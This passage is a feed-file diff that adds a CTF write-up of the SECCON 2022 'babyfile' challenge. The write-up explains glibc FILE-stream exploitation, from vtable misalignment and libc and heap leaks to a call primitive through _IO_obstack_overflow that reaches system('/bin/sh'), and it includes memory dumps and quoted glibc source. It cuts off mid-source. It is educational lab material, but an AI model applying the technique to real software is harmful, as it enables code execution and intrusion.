@@ -8,7 +8,7 @@
     
             <link href="https://nasm.re/tags/nasm/" rel="alternate" type="text/html" title="HTML" />
             <link href="https://nasm.re/tags/nasm/feed.xml" rel="self" type="application/atom+xml" title="Atom" />
-    <updated>2022-10-17T00:10:28+02:00</updated>
+    <updated>2022-11-19T02:39:54+01:00</updated>
     
         <author>
             <name>nasm</name>
@@ -17,6 +17,1307 @@
             </author>
         
     <id>https://nasm.re/tags/nasm/</id>
+        
+        <entry>
+            <title type="html"><![CDATA[[SECCON CTF 2022 Quals] babyfile]]></title>
+            <link href="https://nasm.re/posts/babyfile/?utm_source=atom_feed" rel="alternate" type="text/html"  hreflang="en" />
+            <id>https://nasm.re/posts/babyfile/</id>
+            
+            <published>2022-08-19T00:00:00+00:00</published>
+            <updated>2022-08-19T00:00:00+00:00</updated>
+            
+            
+            <content type="html"><![CDATA[<div class="gblog-post__anchorwrap">
+    <h1 id="introduction">
+        Introduction
+        <a data-clipboard-text="https://nasm.re/posts/babyfile/#introduction" class="gblog-post__anchor gblog-post__anchor--right clip" aria-label="Anchor Introduction" href="#introduction">
+            <svg class="icon gblog_link"><use xlink:href="#gblog_link"></use></svg>
+        </a>
+    </h1>
+</div>
+<p>babyfile is a file stream exploitation I did during the <a
+  class="gblog-markdown__link"
+  href="https://ctftime.org/event/1764"
+  
+  >SECCON CTF 2022 Quals</a
+> event. I didn’t succeed to flag it within the 24 hours :(. But anyway I hope this write up will be interesting to read given I show another way to gain code execution &ndash; I have not seen before &ndash; based on <code>_IO_obstack_jumps</code>! The related files can be found <a
+  class="gblog-markdown__link"
+  href="https://github.com/ret2school/ctf/tree/master/2022/seccon/pwn/babyfile"
+  
+  >here</a
+>. If you&rsquo;re not familiar with file stream internals, I advice you to read my previous writeups about file stream exploitation, espacially <a
+  class="gblog-markdown__link"
+  href="../catastrophe"
+  
+  >this one</a
+> and <a
+  class="gblog-markdown__link"
+  href="../filestream"
+  
+  >this other one</a
+>.</p>
+
+
+
+  <div class="gblog-toc gblog-toc__level--5">
+    <nav id="TableOfContents">
+  <ul>
+    <li><a href="#introduction">Introduction</a>
+      <ul>
+        <li><a href="#tldr">TL;DR</a></li>
+      </ul>
+    </li>
+    <li><a href="#what-we-have">What we have</a></li>
+    <li><a href="#exploitation-ideas">Exploitation ideas</a>
+      <ul>
+        <li><a href="#libc-leak">Libc leak</a></li>
+        <li><a href="#heap-leak">Heap leak</a></li>
+        <li><a href="#obstack-exploitation">obstack exploitation</a></li>
+      </ul>
+    </li>
+    <li><a href="#profit">PROFIT</a></li>
+    <li><a href="#annexes">Annexes</a></li>
+  </ul>
+</nav>
+    <hr />
+  </div>
+
+
+<div class="gblog-post__anchorwrap">
+    <h2 id="tldr">
+        TL;DR
+        <a data-clipboard-text="https://nasm.re/posts/babyfile/#tldr" class="gblog-post__anchor gblog-post__anchor--right clip" aria-label="Anchor TL;DR" href="#tldr">
+            <svg class="icon gblog_link"><use xlink:href="#gblog_link"></use></svg>
+        </a>
+    </h2>
+</div>
+<ul>
+<li>Populate base buffer with heap addresses with the help of <code>_IO_file_doallocate</code>.</li>
+<li>Make both input and output buffer equal to the base buffer with the help of <code>_IO_file_underflow</code>.</li>
+<li>Partial overwrite on right pointers to get a libc leak by simply flushing the file stream.</li>
+<li>Leak a heap address by printing a pointer stored within the main_arena.</li>
+<li><code>_IO_obstack_overflow</code> ends up calling a function pointer stored within the file stream we have control over which leads to a call primitive (plus control over the first argument). Then I just called <code>system(&quot;/bin/sh\x00&quot;)</code>.</li>
+</ul>
+<div class="gblog-post__anchorwrap">
+    <h1 id="what-we-have">
+        What we have
+        <a data-clipboard-text="https://nasm.re/posts/babyfile/#what-we-have" class="gblog-post__anchor gblog-post__anchor--right clip" aria-label="Anchor What we have" href="#what-we-have">
+            <svg class="icon gblog_link"><use xlink:href="#gblog_link"></use></svg>
+        </a>
+    </h1>
+</div>
+<p>The challenge is basically opening <code>/dev/null</code>, asking for an offset and a value to write at <code>fp + offset</code>. And we can freely flush <code>fp</code>. The source code is prodided:</p>
+
+<div class="gblog-expand">
+  <label class="gblog-expand__head flex justify-between" for="577707ec-1">
+    <span>Source code</span>
+    <span>...</span>
+  </label>
+  <input id="577707ec-1" type="checkbox" class="gblog-expand__control hidden" />
+  <div class="gblog-markdown--nested gblog-expand__content">
+    <p>Source code:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
+</span><span class="cp">#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp">
+</span><span class="cp">#include</span> <span class="cpf">&lt;unistd.h&gt;</span><span class="cp">
+</span><span class="cp"></span>
+<span class="k">static</span> <span class="kt">int</span> <span class="nf">menu</span><span class="p">(</span><span class="kt">void</span><span class="p">);</span>
+<span class="k">static</span> <span class="kt">int</span> <span class="nf">getnline</span><span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="n">buf</span><span class="p">,</span> <span class="kt">int</span> <span class="n">size</span><span class="p">);</span>
+<span class="k">static</span> <span class="kt">int</span> <span class="nf">getint</span><span class="p">(</span><span class="kt">void</span><span class="p">);</span>
+
+<span class="cp">#define write_str(s) write(STDOUT_FILENO, s, sizeof(s)-1)
+</span><span class="cp"></span>
+<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">void</span><span class="p">){</span>
+	<span class="n">FILE</span> <span class="o">*</span><span class="n">fp</span><span class="p">;</span>
+
+	<span class="n">alarm</span><span class="p">(</span><span class="mi">30</span><span class="p">);</span>
+
+	<span class="n">write_str</span><span class="p">(</span><span class="s">&#34;Play with FILE structure</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
+
+	<span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="p">(</span><span class="n">fp</span> <span class="o">=</span> <span class="n">fopen</span><span class="p">(</span><span class="s">&#34;/dev/null&#34;</span><span class="p">,</span> <span class="s">&#34;r&#34;</span><span class="p">))){</span>
+		<span class="n">write_str</span><span class="p">(</span><span class="s">&#34;Open error&#34;</span><span class="p">);</span>
+		<span class="k">return</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
+	<span class="p">}</span>
+	<span class="n">fp</span><span class="o">-&gt;</span><span class="n">_wide_data</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
+
+	<span class="k">for</span><span class="p">(;;){</span>
+		<span class="k">switch</span><span class="p">(</span><span class="n">menu</span><span class="p">()){</span>
+			<span class="k">case</span> <span class="mi">0</span><span class="o">:</span>
+				<span class="k">goto</span> <span class="n">END</span><span class="p">;</span>
+			<span class="k">case</span> <span class="mi">1</span><span class="o">:</span>
+				<span class="n">fflush</span><span class="p">(</span><span class="n">fp</span><span class="p">);</span>
+				<span class="k">break</span><span class="p">;</span>
+			<span class="k">case</span> <span class="mi">2</span><span class="o">:</span>
+				<span class="p">{</span>
+					<span class="kt">unsigned</span> <span class="kt">char</span> <span class="n">ofs</span><span class="p">;</span>
+					<span class="n">write_str</span><span class="p">(</span><span class="s">&#34;offset: &#34;</span><span class="p">);</span>
+					<span class="k">if</span><span class="p">((</span><span class="n">ofs</span> <span class="o">=</span> <span class="n">getint</span><span class="p">())</span> <span class="o">&amp;</span> <span class="mh">0x80</span><span class="p">)</span>
+						<span class="n">ofs</span> <span class="o">|=</span> <span class="mh">0x40</span><span class="p">;</span>
+					<span class="n">write_str</span><span class="p">(</span><span class="s">&#34;value: &#34;</span><span class="p">);</span>
+					<span class="p">((</span><span class="kt">char</span><span class="o">*</span><span class="p">)</span><span class="n">fp</span><span class="p">)[</span><span class="n">ofs</span><span class="p">]</span> <span class="o">=</span> <span class="n">getint</span><span class="p">();</span>
+				<span class="p">}</span>
+				<span class="k">break</span><span class="p">;</span>
+		<span class="p">}</span>
+		<span class="n">write_str</span><span class="p">(</span><span class="s">&#34;Done.</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
+	<span class="p">}</span>
+
+<span class="nl">END</span><span class="p">:</span>
+	<span class="n">write_str</span><span class="p">(</span><span class="s">&#34;Bye!&#34;</span><span class="p">);</span>
+	<span class="n">_exit</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
+<span class="p">}</span>
+
+<span class="k">static</span> <span class="kt">int</span> <span class="nf">menu</span><span class="p">(</span><span class="kt">void</span><span class="p">){</span>
+	<span class="n">write_str</span><span class="p">(</span><span class="s">&#34;</span><span class="se">\n</span><span class="s">MENU</span><span class="se">\n</span><span class="s">&#34;</span>
+			<span class="s">&#34;1. Flush</span><span class="se">\n</span><span class="s">&#34;</span>
+			<span class="s">&#34;2. Trick</span><span class="se">\n</span><span class="s">&#34;</span>
+			<span class="s">&#34;0. Exit</span><span class="se">\n</span><span class="s">&#34;</span>
+			<span class="s">&#34;&gt; &#34;</span><span class="p">);</span>
+
+	<span class="k">return</span> <span class="n">getint</span><span class="p">();</span>
+<span class="p">}</span>
+
+<span class="k">static</span> <span class="kt">int</span> <span class="nf">getnline</span><span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="n">buf</span><span class="p">,</span> <span class="kt">int</span> <span class="n">size</span><span class="p">){</span>
+	<span class="kt">int</span> <span class="n">len</span><span class="p">;</span>
+
+	<span class="k">if</span><span class="p">(</span><span class="n">size</span> <span class="o">&lt;=</span> <span class="mi">0</span> <span class="o">||</span> <span class="p">(</span><span class="n">len</span> <span class="o">=</span> <span class="n">read</span><span class="p">(</span><span class="n">STDIN_FILENO</span><span class="p">,</span> <span class="n">buf</span><span class="p">,</span> <span class="n">size</span><span class="o">-</span><span class="mi">1</span><span class="p">))</span> <span class="o">&lt;=</span> <span class="mi">0</span><span class="p">)</span>
+		<span class="k">return</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
+
+	<span class="k">if</span><span class="p">(</span><span class="n">buf</span><span class="p">[</span><span class="n">len</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span><span class="o">==</span><span class="sc">&#39;\n&#39;</span><span class="p">)</span>
+		<span class="n">len</span><span class="o">--</span><span class="p">;</span>
+	<span class="n">buf</span><span class="p">[</span><span class="n">len</span><span class="p">]</span> <span class="o">=</span> <span class="sc">&#39;\0&#39;</span><span class="p">;</span>
+
+	<span class="k">return</span> <span class="n">len</span><span class="p">;</span>
+<span class="p">}</span>
+
+<span class="k">static</span> <span class="kt">int</span> <span class="nf">getint</span><span class="p">(</span><span class="kt">void</span><span class="p">){</span>
+	<span class="kt">char</span> <span class="n">buf</span><span class="p">[</span><span class="mh">0x10</span><span class="p">]</span> <span class="o">=</span> <span class="p">{};</span>
+
+	<span class="n">getnline</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">buf</span><span class="p">));</span>
+	<span class="k">return</span> <span class="n">atoi</span><span class="p">(</span><span class="n">buf</span><span class="p">);</span>
+<span class="p">}</span>
+</code></pre></div>
+  </div>
+</div>
+
+<div class="gblog-post__anchorwrap">
+    <h1 id="exploitation-ideas">
+        Exploitation ideas
+        <a data-clipboard-text="https://nasm.re/posts/babyfile/#exploitation-ideas" class="gblog-post__anchor gblog-post__anchor--right clip" aria-label="Anchor Exploitation ideas" href="#exploitation-ideas">
+            <svg class="icon gblog_link"><use xlink:href="#gblog_link"></use></svg>
+        </a>
+    </h1>
+</div>
+<p>I tried (in this order) to:</p>
+<ul>
+<li>Get a libc leak by calling <code>_IO_file_underflow</code> to make input and output buffers equal to the base buffer that contains with the help of <code>_IO_file_doallocate</code> a heap address. And then flushing the file stream to leak the libc. <span class="emoji">✅</span>
+</li>
+<li>Get a heap leak by leaking a heap pointer stored within the <code>main_arena</code>. <span class="emoji">✅</span>
+</li>
+<li>Get an arbitrary write with a tcache dup technique, I got <code>__free_hook</code> as the last pointer available in the target tcache bin but I didn&rsquo;t succeeded to get a shell &gt;.&lt;. <span class="emoji">❌</span>
+</li>
+<li>Call primitive with control over the first argument by calling <code>_IO_obstack_overflow</code> (part of the <code>_IO_obstack_jumps</code> vtable). Then it allows us to call <code>system(&quot;/bin/sh\x00&quot;)</code>. <span class="emoji">✅</span>
+</li>
+</ul>
+<div class="gblog-post__anchorwrap">
+    <h2 id="libc-leak">
+        Libc leak
+        <a data-clipboard-text="https://nasm.re/posts/babyfile/#libc-leak" class="gblog-post__anchor gblog-post__anchor--right clip" aria-label="Anchor Libc leak" href="#libc-leak">
+            <svg class="icon gblog_link"><use xlink:href="#gblog_link"></use></svg>
+        </a>
+    </h2>
+</div>
+<p>To get a libc leak we have to write on stdout a certain amount of bytes that leak a libc address. To do so we&rsquo;re looking for a way to make interesting pointers appear as the base buffer to then initialize both input and output buffer to the base buffer and then do a partial overwrite on these fields to point to an area that contains libc pointers. To get heap addresses within the base buffer we can misalign the vtable such a way that <code>fp-&gt;vtable-&gt;sync()</code> calls <code>_IO_default_doallocate</code>. Then <code>_IO_default_doallocate</code> is called and does some operations:</p>
+<p>The initial state of the file stream looks like this:</p>
+<pre tabindex="0"><code>0x5649e80772a0: 0x00000000fbad2488      0x0000000000000000
+0x5649e80772b0: 0x0000000000000000      0x0000000000000000
+0x5649e80772c0: 0x0000000000000000      0x0000000000000000
+0x5649e80772d0: 0x0000000000000000      0x0000000000000000
+0x5649e80772e0: 0x0000000000000000      0x0000000000000000
+0x5649e80772f0: 0x0000000000000000      0x0000000000000000
+0x5649e8077300: 0x0000000000000000      0x00007f4092dc85c0
+0x5649e8077310: 0x0000000000000003      0x0000000000000000
+0x5649e8077320: 0x0000000000000000      0x00005649e8077380
+0x5649e8077330: 0xffffffffffffffff      0x0000000000000000
+0x5649e8077340: 0x00005649e8077390      0x0000000000000000
+0x5649e8077350: 0x0000000000000000      0x0000000000000000
+0x5649e8077360: 0x0000000000000000      0x0000000000000000
+0x5649e8077370: 0x0000000000000000      0x00007f4092dc44a0
+0x5649e8077380: 0x0000000000000000      0x0000000000000000
+</code></pre><p>It initializes the base buffer to a fresh <code>BUFSIZE</code> allocated buffer.
+
+<div class="gblog-expand">
+  <label class="gblog-expand__head flex justify-between" for="dd3f063e-6">
+    <span>_IO_default_doallocate</span>
+    <span>...</span>
+  </label>
+  <input id="dd3f063e-6" type="checkbox" class="gblog-expand__control hidden" />
+  <div class="gblog-markdown--nested gblog-expand__content">
+    <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="kt">int</span>
+<span class="nf">_IO_default_doallocate</span> <span class="p">(</span><span class="n">FILE</span> <span class="o">*</span><span class="n">fp</span><span class="p">)</span>
+<span class="p">{</span>
+  <span class="kt">char</span> <span class="o">*</span><span class="n">buf</span><span class="p">;</span>
+
+  <span class="n">buf</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="n">BUFSIZ</span><span class="p">);</span>
+  <span class="k">if</span> <span class="p">(</span><span class="n">__glibc_unlikely</span> <span class="p">(</span><span class="n">buf</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">))</span>
+    <span class="k">return</span> <span class="n">EOF</span><span class="p">;</span>
+
+  <span class="n">_IO_setb</span> <span class="p">(</span><span class="n">fp</span><span class="p">,</span> <span class="n">buf</span><span class="p">,</span> <span class="n">buf</span><span class="o">+</span><span class="n">BUFSIZ</span><span class="p">,</span> <span class="mi">1</span><span class="p">);</span>
+  <span class="k">return</span> <span class="mi">1</span><span class="p">;</span>
+<span class="p">}</span>
+</code></pre></div>
+  </div>
+</div>
+</p>
+
+<div class="gblog-expand">
+  <label class="gblog-expand__head flex justify-between" for="9a2bb157-7">
+    <span>fp state after the _IO_default_doallocate</span>
+    <span>...</span>
+  </label>
+  <input id="9a2bb157-7" type="checkbox" class="gblog-expand__control hidden" />
+  <div class="gblog-markdown--nested gblog-expand__content">
+    <pre tabindex="0"><code>0x5649e80772a0: 0x00000000fbad2488      0x0000000000000000
+0x5649e80772b0: 0x0000000000000000      0x0000000000000000
+0x5649e80772c0: 0x0000000000000000      0x0000000000000000
+0x5649e80772d0: 0x0000000000000000      0x00005649e8077480
+0x5649e80772e0: 0x00005649e8079480      0x0000000000000000
+0x5649e80772f0: 0x0000000000000000      0x0000000000000000
+0x5649e8077300: 0x0000000000000000      0x00007f4092dc85c0
+0x5649e8077310: 0x0000000000000003      0x0000000000000000
+0x5649e8077320: 0x0000000000000000      0x00005649e8077380
+0x5649e8077330: 0xffffffffffffffff      0x0000000000000000
+0x5649e8077340: 0x0000000000000000      0x0000000000000000
+0x5649e8077350: 0x0000000000000000      0x0000000000000000
+0x5649e8077360: 0x0000000000000000      0x0000000000000000
+0x5649e8077370: 0x0000000000000000      0x00007f4092dc4460
+0x5649e8077380: 0x0000000000000000      0x0000000000000000
+</code></pre>
+  </div>
+</div>
+
+<p>Once we have a valid pointer into the base buffer, we try to get into both the input and output buffer the base pointer.
+Given the input / output buffer are <code>NULL</code> and that <code>fp-&gt;flags</code> is <code>0xfbad1800 | 0x8000</code> (plus <code>0x8000</code> =&gt; <code>_IO_USER_LOCK</code> to not stuck into <code>fflush</code>), we do not have issues with the checks. The issue with the <code>_IO_SYSREAD</code> call is described in the code below.
+
+<div class="gblog-expand">
+  <label class="gblog-expand__head flex justify-between" for="5a49cc25-8">
+    <span>_IO_new_file_underflow</span>
+    <span>...</span>
+  </label>
+  <input id="5a49cc25-8" type="checkbox" class="gblog-expand__control hidden" />
+  <div class="gblog-markdown--nested gblog-expand__content">
+    <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="kt">int</span>
+<span class="nf">_IO_new_file_underflow</span> <span class="p">(</span><span class="n">FILE</span> <span class="o">*</span><span class="n">fp</span><span class="p">)</span>
+<span class="p">{</span>
+  <span class="n">ssize_t</span> <span class="n">count</span><span class="p">;</span>
+
+  <span class="cm">/* C99 requires EOF to be &#34;sticky&#34;.  */</span>
+  <span class="k">if</span> <span class="p">(</span><span class="n">fp</span><span class="o">-&gt;</span><span class="n">_flags</span> <span class="o">&amp;</span> <span class="n">_IO_EOF_SEEN</span><span class="p">)</span>
+    <span class="k">return</span> <span class="n">EOF</span><span class="p">;</span>
+
+  <span class="k">if</span> <span class="p">(</span><span class="n">fp</span><span class="o">-&gt;</span><span class="n">_flags</span> <span class="o">&amp;</span> <span class="n">_IO_NO_READS</span><span class="p">)</span>
+    <span class="p">{</span>
+      <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_flags</span> <span class="o">|=</span> <span class="n">_IO_ERR_SEEN</span><span class="p">;</span>
+      <span class="n">__set_errno</span> <span class="p">(</span><span class="n">EBADF</span><span class="p">);</span>
+      <span class="k">return</span> <span class="n">EOF</span><span class="p">;</span>
+    <span class="p">}</span>
+  <span class="k">if</span> <span class="p">(</span><span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_read_ptr</span> <span class="o">&lt;</span> <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_read_end</span><span class="p">)</span>
+    <span class="k">return</span> <span class="o">*</span><span class="p">(</span><span class="kt">unsigned</span> <span class="kt">char</span> <span class="o">*</span><span class="p">)</span> <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_read_ptr</span><span class="p">;</span>
+
+  <span class="k">if</span> <span class="p">(</span><span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_buf_base</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span>
+    <span class="p">{</span>
+      <span class="cm">/* Maybe we already have a push back pointer.  */</span>
+      <span class="k">if</span> <span class="p">(</span><span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_save_base</span> <span class="o">!=</span> <span class="nb">NULL</span><span class="p">)</span>
+	<span class="p">{</span>
+	  <span class="n">free</span> <span class="p">(</span><span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_save_base</span><span class="p">);</span>
+	  <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_flags</span> <span class="o">&amp;=</span> <span class="o">~</span><span class="n">_IO_IN_BACKUP</span><span class="p">;</span>
+	<span class="p">}</span>
+      <span class="n">_IO_doallocbuf</span> <span class="p">(</span><span class="n">fp</span><span class="p">);</span>
+    <span class="p">}</span>
+
+  <span class="cm">/* FIXME This can/should be moved to genops ?? */</span>
+  <span class="k">if</span> <span class="p">(</span><span class="n">fp</span><span class="o">-&gt;</span><span class="n">_flags</span> <span class="o">&amp;</span> <span class="p">(</span><span class="n">_IO_LINE_BUF</span><span class="o">|</span><span class="n">_IO_UNBUFFERED</span><span class="p">))</span>
+    <span class="p">{</span>
+      <span class="cm">/* We used to flush all line-buffered stream.  This really isn&#39;t
+</span><span class="cm">	 required by any standard.  My recollection is that
+</span><span class="cm">	 traditional Unix systems did this for stdout.  stderr better
+</span><span class="cm">	 not be line buffered.  So we do just that here
+</span><span class="cm">	 explicitly.  --drepper */</span>
+      <span class="n">_IO_acquire_lock</span> <span class="p">(</span><span class="n">stdout</span><span class="p">);</span>
+
+      <span class="k">if</span> <span class="p">((</span><span class="n">stdout</span><span class="o">-&gt;</span><span class="n">_flags</span> <span class="o">&amp;</span> <span class="p">(</span><span class="n">_IO_LINKED</span> <span class="o">|</span> <span class="n">_IO_NO_WRITES</span> <span class="o">|</span> <span class="n">_IO_LINE_BUF</span><span class="p">))</span>
+	  <span class="o">==</span> <span class="p">(</span><span class="n">_IO_LINKED</span> <span class="o">|</span> <span class="n">_IO_LINE_BUF</span><span class="p">))</span>
+	<span class="n">_IO_OVERFLOW</span> <span class="p">(</span><span class="n">stdout</span><span class="p">,</span> <span class="n">EOF</span><span class="p">);</span>
+
+      <span class="n">_IO_release_lock</span> <span class="p">(</span><span class="n">stdout</span><span class="p">);</span>
+    <span class="p">}</span>
+
+  <span class="n">_IO_switch_to_get_mode</span> <span class="p">(</span><span class="n">fp</span><span class="p">);</span>
+
+  <span class="cm">/* This is very tricky. We have to adjust those
+</span><span class="cm">     pointers before we call _IO_SYSREAD () since
+</span><span class="cm">     we may longjump () out while waiting for
+</span><span class="cm">     input. Those pointers may be screwed up. H.J. */</span>
+  <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_read_base</span> <span class="o">=</span> <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_read_ptr</span> <span class="o">=</span> <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_buf_base</span><span class="p">;</span>
+  <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_read_end</span> <span class="o">=</span> <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_buf_base</span><span class="p">;</span>
+  <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_write_base</span> <span class="o">=</span> <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_write_ptr</span> <span class="o">=</span> <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_write_end</span>
+    <span class="o">=</span> <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_buf_base</span><span class="p">;</span>
+
+  <span class="cm">/* Given the vtable is misaligned, _IO_SYSREAD will call 
+</span><span class="cm">  _IO_default_pbackfail, the code is given after _IO_new_file_underflow */</span>
+  <span class="n">count</span> <span class="o">=</span> <span class="n">_IO_SYSREAD</span> <span class="p">(</span><span class="n">fp</span><span class="p">,</span> <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_buf_base</span><span class="p">,</span>
+		       <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_buf_end</span> <span class="o">-</span> <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_buf_base</span><span class="p">);</span>
+
+
+  <span class="k">if</span> <span class="p">(</span><span class="n">count</span> <span class="o">&lt;=</span> <span class="mi">0</span><span class="p">)</span>
+    <span class="p">{</span>
+      <span class="k">if</span> <span class="p">(</span><span class="n">count</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span>
+	<span class="n">fp</span><span class="o">-&gt;</span><span class="n">_flags</span> <span class="o">|=</span> <span class="n">_IO_EOF_SEEN</span><span class="p">;</span>
+      <span class="k">else</span>
+	<span class="n">fp</span><span class="o">-&gt;</span><span class="n">_flags</span> <span class="o">|=</span> <span class="n">_IO_ERR_SEEN</span><span class="p">,</span> <span class="n">count</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+  <span class="p">}</span>
+  <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_read_end</span> <span class="o">+=</span> <span class="n">count</span><span class="p">;</span>
+  <span class="k">if</span> <span class="p">(</span><span class="n">count</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span>
+    <span class="p">{</span>
+      <span class="cm">/* If a stream is read to EOF, the calling application may switch active
+</span><span class="cm">	 handles.  As a result, our offset cache would no longer be valid, so
+</span><span class="cm">	 unset it.  */</span>
+      <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_offset</span> <span class="o">=</span> <span class="n">_IO_pos_BAD</span><span class="p">;</span>
+      <span class="k">return</span> <span class="n">EOF</span><span class="p">;</span>
+    <span class="p">}</span>
+  <span class="k">if</span> <span class="p">(</span><span class="n">fp</span><span class="o">-&gt;</span><span class="n">_offset</span> <span class="o">!=</span> <span class="n">_IO_pos_BAD</span><span class="p">)</span>
+    <span class="n">_IO_pos_adjust</span> <span class="p">(</span><span class="n">fp</span><span class="o">-&gt;</span><span class="n">_offset</span><span class="p">,</span> <span class="n">count</span><span class="p">);</span>
+  <span class="k">return</span> <span class="o">*</span><span class="p">(</span><span class="kt">unsigned</span> <span class="kt">char</span> <span class="o">*</span><span class="p">)</span> <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_read_ptr</span><span class="p">;</span>
+<span class="p">}</span>
+<span class="n">libc_hidden_ver</span> <span class="p">(</span><span class="n">_IO_new_file_underflow</span><span class="p">,</span> <span class="n">_IO_file_underflow</span><span class="p">)</span>
+</code></pre></div>
+  </div>
+</div>
+</p>
+
+<div class="gblog-expand">
+  <label class="gblog-expand__head flex justify-between" for="a0517a8d-9">
+    <span>_IO_default_pbackfail</span>
+    <span>...</span>
+  </label>
+  <input id="a0517a8d-9" type="checkbox" class="gblog-expand__control hidden" />
+  <div class="gblog-markdown--nested gblog-expand__content">
+    <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="kt">int</span>
+<span class="nf">_IO_default_pbackfail</span> <span class="p">(</span><span class="n">FILE</span> <span class="o">*</span><span class="n">fp</span><span class="p">,</span> <span class="kt">int</span> <span class="n">c</span><span class="p">)</span>
+<span class="p">{</span>
+  <span class="k">if</span> <span class="p">(</span><span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_read_ptr</span> <span class="o">&gt;</span> <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_read_base</span> <span class="o">&amp;&amp;</span> <span class="o">!</span><span class="n">_IO_in_backup</span> <span class="p">(</span><span class="n">fp</span><span class="p">)</span>
+      <span class="o">&amp;&amp;</span> <span class="p">(</span><span class="kt">unsigned</span> <span class="kt">char</span><span class="p">)</span> <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_read_ptr</span><span class="p">[</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span> <span class="o">==</span> <span class="n">c</span><span class="p">)</span>
+    <span class="o">--</span><span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_read_ptr</span><span class="p">;</span>
+  <span class="k">else</span>
+    <span class="p">{</span>
+      <span class="cm">/* Need to handle a filebuf in write mode (switch to read mode). FIXME!*/</span>
+      <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">_IO_in_backup</span> <span class="p">(</span><span class="n">fp</span><span class="p">))</span>
+	<span class="p">{</span>
+	  <span class="cm">/* We need to keep the invariant that the main get area
+</span><span class="cm">	     logically follows the backup area.  */</span>
+	  <span class="k">if</span> <span class="p">(</span><span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_read_ptr</span> <span class="o">&gt;</span> <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_read_base</span> <span class="o">&amp;&amp;</span> <span class="n">_IO_have_backup</span> <span class="p">(</span><span class="n">fp</span><span class="p">))</span>
+	    <span class="p">{</span>
+	      <span class="k">if</span> <span class="p">(</span><span class="n">save_for_backup</span> <span class="p">(</span><span class="n">fp</span><span class="p">,</span> <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_read_ptr</span><span class="p">))</span>
+		<span class="k">return</span> <span class="n">EOF</span><span class="p">;</span>
+	    <span class="p">}</span>
+	  <span class="k">else</span> <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">_IO_have_backup</span> <span class="p">(</span><span class="n">fp</span><span class="p">))</span>
+	    <span class="p">{</span>
+	      <span class="cm">/* No backup buffer: allocate one. */</span>
+	      <span class="cm">/* Use nshort buffer, if unused? (probably not)  FIXME */</span>
+	      <span class="kt">int</span> <span class="n">backup_size</span> <span class="o">=</span> <span class="mi">128</span><span class="p">;</span>
+	      <span class="kt">char</span> <span class="o">*</span><span class="n">bbuf</span> <span class="o">=</span> <span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span> <span class="n">malloc</span> <span class="p">(</span><span class="n">backup_size</span><span class="p">);</span>
+	      <span class="k">if</span> <span class="p">(</span><span class="n">bbuf</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span>
+		<span class="k">return</span> <span class="n">EOF</span><span class="p">;</span>
+	      <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_save_base</span> <span class="o">=</span> <span class="n">bbuf</span><span class="p">;</span>
+	      <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_save_end</span> <span class="o">=</span> <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_save_base</span> <span class="o">+</span> <span class="n">backup_size</span><span class="p">;</span>
